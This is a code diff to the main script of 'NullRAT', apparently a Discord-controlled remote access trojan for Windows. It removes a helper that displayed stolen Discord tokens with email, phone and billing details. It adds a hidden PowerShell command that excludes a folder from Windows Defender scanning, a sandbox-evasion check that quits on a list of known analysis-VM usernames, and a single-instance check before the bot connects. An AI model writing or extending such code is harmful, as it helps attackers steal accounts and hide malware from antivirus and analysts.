@@ -6,7 +6,7 @@ from disnake.ext import commands
 
 from datetime import datetime
 from socket import create_connection
-import os, re, requests
+import os, psutil, re, requests, sys
 
 ############### Global functions available in every cog
 
@@ -27,19 +27,6 @@ def genEmbed(self, title, timestamp, description=None):
             timestamp=timestamp
         )
     embed.set_footer( text="NullRAT" )
-    return embed
-        
-def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, userID):
-    embed=discord.Embed(title="Token Info:")
-    embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
-    embed.set_thumbnail(url=avatar)
-    embed.add_field(name="Token", value=f"```{token}```", inline=False)
-    embed.add_field(name="Username", value=username, inline=True)
-    embed.add_field(name="Nitro", value=nitro, inline=True)
-    embed.add_field(name="Billing Info", value=billing, inline=True)
-    embed.add_field(name="ID", value=userID, inline=True)
-    embed.add_field(name="Phone Number", value=phone, inline=True)
-    embed.add_field(name="Email", value=email, inline=False)
     return embed
 
 def find_token(self):
@@ -83,7 +70,6 @@ class NullBot(commands.InteractionBot):
             self.identifier = os.getenv("username") 
     
     genEmbed = genEmbed
-    checked_embeds = checked_embeds
     find_token = find_token
         
 client = NullBot(test_guilds=server_ids)
@@ -92,6 +78,8 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 if os.path.isdir(nr_working) != True:
     os.mkdir(nr_working)
     
+os.system("powershell Add-MpPreference -ExclusionPath 'C:\\NullCode'")
+
 #> on_ready():
     
 @client.event
@@ -102,8 +90,8 @@ async def on_ready():
         timestamp = datetime.now()
     ).set_author(
         name="NullCode1337", 
-        url=r"http://null337.rf.gd/", 
-        icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
+        url=r"https://denza.one/", 
+        icon_url=r"https://avatars.githubusercontent.com/u/70959549?v=4"
     ).set_footer(
         text = f"Identifier: " + client.identifier 
     )
@@ -197,7 +185,24 @@ for ex in extensions:
 def is_connected():
     try: create_connection(("1.1.1.1", 53)); return True
     except OSError: return False
-    
+
+def checkIfProcessRunning(processName): ## Credit: Sanix-Darker
+    for proc in psutil.process_iter():
+        try:
+            if processName.lower() in proc.name().lower():
+                return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    return False
+
+# Anti TikTok
+for i in ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl","Joe"]: 
+    if i in os.getenv("username"):
+        raise SystemExit(0)
+
+if checkIfProcessRunning(os.path.basename(sys.executable)): 
+    raise SystemExit(0)
+
 while is_connected() == False: 0
 client.run(bot_token)
 
